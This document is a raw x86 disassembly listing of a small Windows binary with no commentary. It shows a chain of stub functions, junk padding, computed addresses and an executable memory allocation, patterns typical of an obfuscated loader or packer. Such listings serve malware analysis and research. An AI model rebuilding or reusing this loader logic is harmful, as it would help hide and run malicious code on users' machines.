0x00401024:	jb	0x00401044	; targets: 0x0040102a(MAY), 0x00401044(MAY)	; from: 0x004010cd(MAY)
0x0040102a:	addb	%al, (%eax)	; from: 0x00401024(MAY)
0x0040102c:	addb	%al, (%eax)
0x0040102e:	addb	%al, (%eax)
0x00401030:	addb	%al, (%eax)
0x00401032:	addb	%al, (%eax)
0x00401034:	addb	%al, (%eax)
0x00401036:	addb	%al, (%eax)
0x00401038:	addb	%al, (%eax)
0x0040103a:	addb	%al, (%eax)
0x0040103c:	addb	%al, (%eax)
0x0040103e:	addb	%al, (%eax)
0x00401040:	addb	%al, (%eax)
0x00401042:	addb	%al, (%eax)
0x00401044:	movl	%edi, %edi	; from: 0x00401024(MAY)
0x00401046:	pusha	
0x00401047:	pushl	%ebp
0x00401048:	movl	%esp, %ebp
0x0040104a:	subl	$0x34, %esp
0x0040104d:	pushl	%ebx
0x0040104e:	pushl	%ecx
0x0040104f:	pushl	%esi
0x00401050:	pushl	%edi
0x00401051:	call	0x004011dc	; targets: 0x004011dc(MAY)

start:
0x00401098:	andb	$0x0, %al
0x0040109a:	movzbl	%al, %eax
0x0040109d:	pushl	%eax
0x0040109e:	pushl	$0x4020aa
0x004010a3:	popl	%edi
0x004010a4:	adcl	$0x403002, (%esp)
0x004010ab:	movb	0x1(%edi), %ah
0x004010ae:	movb	(%edi), %al
0x004010b0:	roll	$0x10, %eax
0x004010b3:	pushl	0x3a(%eax)
0x004010b6:	popl	%edx
0x004010b7:	shrl	$0x10, %edx
0x004010ba:	addl	$0x1d, %edx
0x004010bd:	addl	%eax, %edx
0x004010bf:	cmpb	$0x3a, (%edx)
0x004010c2:	jb	0x004010d2	; targets: 0x004010c4(MAY), 0x004010d2(MAY)
0x004010c4:	xorl	%eax, %eax	; from: 0x004010c2(MAY)
0x004010c6:	cmpb	$0x55, (%eax,%edx)
0x004010ca:	ja	0x004010d2	; targets: 0x004010d2(MAY), 0x004010cc(MAY)
0x004010cc:	popl	%ebx	; from: 0x004010ca(MAY)
0x004010cd:	jmp	0x00401024	; targets: 0x00401024(MAY)
0x004010d2:	popl	%ecx	; from: 0x004010c2(MAY), 0x004010ca(MAY)
0x004010d3:	addb	%al, (%eax)
0x004010d5:	addb	%al, 0x43(%edi)
0x004010d8:	addb	%al, (%eax)
0x004010da:	addb	%al, (%eax)
0x004010dc:	addb	%al, (%eax)
0x004010de:	addb	%al, (%eax)
0x004010e0:	addb	%al, (%eax)
0x004010e2:	addb	%al, (%eax)
0x004010e4:	movl	%edi, %edi	; from: 0x00401250(MAY)
0x004010e6:	pushl	%ebp
0x004010e7:	movl	%esp, %ebp
0x004010e9:	subl	$0x34, %esp
0x004010ec:	pushl	%ebx
0x004010ed:	pushl	(%ebx)
0x004010ef:	pushl	%ecx
0x004010f0:	pushl	%ecx
0x004010f1:	call	0x00401224	; targets: 0x00401224(MAY)
0x00401110:	movl	%edi, %edi	; from: 0x00401354(MAY)
0x00401112:	pushl	%ebp
0x00401113:	movl	%esp, %ebp
0x00401115:	subl	$0x54, %esp
0x00401118:	pushl	%ebx
0x00401119:	pushl	%esi
0x0040111a:	pushl	(%ebx)
0x0040111c:	pushl	(%ebx)
0x0040111e:	call	0x0040127c	; targets: 0x0040127c(MAY)
0x004011dc:	movl	%edi, %edi	; from: 0x00401051(MAY)
0x004011de:	pushl	%ebp
0x004011df:	movl	%esp, %ebp
0x004011e1:	subl	$0x5c, %esp
0x004011e4:	pushl	%ebx
0x004011e5:	pushl	%edx
0x004011e6:	pushl	(%ebx)
0x004011e8:	pushl	(%ebx)
0x004011ea:	pushl	%edx
0x004011eb:	call	0x00401244	; targets: 0x00401244(MAY)
0x00401224:	movl	%edi, %edi	; from: 0x004010f1(MAY)
0x00401226:	pushl	%ebp
0x00401227:	movl	%esp, %ebp
0x00401229:	subl	$0x40, %esp
0x0040122c:	pushl	%ebx
0x0040122d:	pushl	%esi
0x0040122e:	pushl	%ecx
0x0040122f:	call	0x004013c8	; targets: 0x004013c8(MAY)
0x00401244:	movl	%edi, %edi	; from: 0x004011eb(MAY)
0x00401246:	pushl	%ebp
0x00401247:	movl	%esp, %ebp
0x00401249:	subl	$0x44, %esp
0x0040124c:	pushl	%ebx
0x0040124d:	pushl	%ecx
0x0040124e:	pushl	(%ebx)
0x00401250:	call	0x004010e4	; targets: 0x004010e4(MAY)
0x0040127c:	movl	%edi, %edi	; from: 0x0040111e(MAY)
0x0040127e:	movl	%esp, %ebp
0x00401280:	subl	$0x48, %esp
0x00401283:	pushl	$0x40
0x00401285:	movl	$0x1000, %eax
0x0040128a:	pushl	%eax
0x0040128b:	movl	$0x6c0, %edx
0x00401290:	pushl	%edx
0x00401291:	movl	$0x0, %esi
0x00401296:	pushl	%esi
0x00401297:	leal	0x56ba43bd, %eax
0x0040129d:	subl	$0x567a2391, %eax
0x004012a2:	pushl	(%eax)
0x004012a4:	pushl	$0x402004
0x004012a9:	popl	%eax
0x004012aa:	popl	(%eax)
0x004012ac:	decl	(%eax)
0x004012ae:	movl	WaitForSingleObject@kernel32.dll, %eax
0x004012b3:	call	%eax	; targets: 0xff00002f(MAY)
0x00401348:	movl	%edi, %edi	; from: 0x004013d6(MAY)
0x0040134a:	pushl	%ebp
0x0040134b:	movl	%esp, %ebp
0x0040134d:	subl	$0x28, %esp
0x00401350:	pushl	%ebx
0x00401351:	pushl	%edi
0x00401352:	pushl	(%ebx)
0x00401354:	call	0x00401110	; targets: 0x00401110(MAY)
0x004013c8:	movl	%edi, %edi	; from: 0x0040122f(MAY)
0x004013ca:	pushl	%ebp
0x004013cb:	movl	%esp, %ebp
0x004013cd:	subl	$0x1c, %esp
0x004013d0:	pushl	%ebx
0x004013d1:	pushl	(%ebx)
0x004013d3:	pushl	%esi
0x004013d4:	pushl	(%ebx)
0x004013d6:	call	0x00401348	; targets: 0x00401348(MAY)
